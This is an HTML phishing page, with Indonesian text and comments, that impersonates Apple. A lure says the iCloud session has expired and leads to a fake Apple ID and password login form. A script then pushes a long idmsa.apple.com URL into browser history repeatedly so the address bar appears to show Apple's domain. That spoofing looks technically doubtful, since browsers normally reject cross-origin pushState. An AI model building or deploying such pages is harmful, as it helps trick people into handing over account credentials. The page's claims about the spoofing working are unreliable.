<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pembaruan Akun Apple</title>
    <style>
        /* Desain Umum */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f7;
            overflow: hidden;
        }

        /* Halaman Depan (Lure) */
        #lure-page {
            text-align: center;
            padding: 20px;
        }

        .apple-logo {
            width: 50px;
            margin-bottom: 20px;
            filter: grayscale(100%);
        }

        h1 { font-size: 24px; font-weight: 600; color: #1d1d1f; }
        p { color: #86868b; font-size: 16px; margin-bottom: 30px; }

        .btn-click {
            background-color: #0071e3;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 16px;
            border: none;
            cursor: pointer;
        }

        /* Halaman Login Palsu (Awalnya Tersembunyi) */
        #fake-login {
            display: none;
            width: 100%;
            height: 100%;
            background-color: #000;
            color: #fff;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: absolute;
            top: 0;
            left: 0;
        }

        .login-box { width: 100%; max-width: 350px; text-align: center; }
        .input-group { background: #1c1c1e; border-radius: 12px; margin: 20px 0; border: 0.5px solid #3a3a3c; }
        input {
            width: 100%; padding: 18px; background: transparent; border: none;
            color: #fff; font-size: 17px; box-sizing: border-box; outline: none;
        }
        input:first-child { border-bottom: 0.5px solid #3a3a3c; }
        .footer-text { color: #86868b; font-size: 12px; margin-top: 40px; }
    </style>
</head>
<body>

    <div id="lure-page">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo" alt="Apple">
        <h1>Sesi iCloud Berakhir</h1>
        <p>Harap verifikasi identitas Anda untuk melanjutkan penggunaan layanan Apple.</p>
        <button class="btn-click" onclick="executeSpoof()">Click Here to Verify</button>
    </div>

    <div id="fake-login">
        <div class="login-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" style="width: 60px; filter: invert(1); margin-bottom: 20px;">
            <h2 style="font-size: 24px;">Sign in with Apple ID</h2>
            <div class="input-group">
                <input type="text" placeholder="Apple ID">
                <input type="password" placeholder="Password">
            </div>
            <p style="color: #0a84ff; font-size: 14px;">Lupa Apple ID atau Kata Sandi?</p>
            <div class="footer-text">
                Hak Cipta Â© 2026 Apple Inc.
            </div>
        </div>
    </div>

    <script>
        function executeSpoof() {
            // Sembunyikan halaman depan, tampilkan form login
            document.getElementById('lure-page').style.display = 'none';
            document.getElementById('fake-login').style.display = 'flex';

            // DOMAIN PALSU YANG SANGAT PANJANG
            // Ini akan memaksa Safari memotong URL sehingga hanya idmsa.apple.com yang terlihat
            const targetUrl = "https://idmsa.apple.com/appleauth/auth/authorize/signin?frame_id=daw-7ceaddfd-4038-4410-8784-a3ff4d5be365&language=ID-ID&skVersion=7&iframeId=daw-7ceaddfd-4038-4410-8784-a3ff4d5be365&client_id=992b008db1a63b0ce3eb77a87d2d37b37e4fbc768dcbc1279386dd6fce827761&redirect_uri=https://idmsa.apple.com&response_type=code&response_mode=web_message&state=daw-7ceaddfd-4038-4410-8784-a3ff4d5be365&authVersion=latest";

            // Eksekusi manipulasi URL agresif
            for (let i = 0; i < 250; i++) {
                window.history.pushState({}, '', targetUrl);
            }

            // Pertahankan domain palsu agar tidak hilang saat pengguna berinteraksi
            setInterval(() => {
                window.history.replaceState({}, '', targetUrl);
            }, 1);
        }
    </script>
</body>
</html>
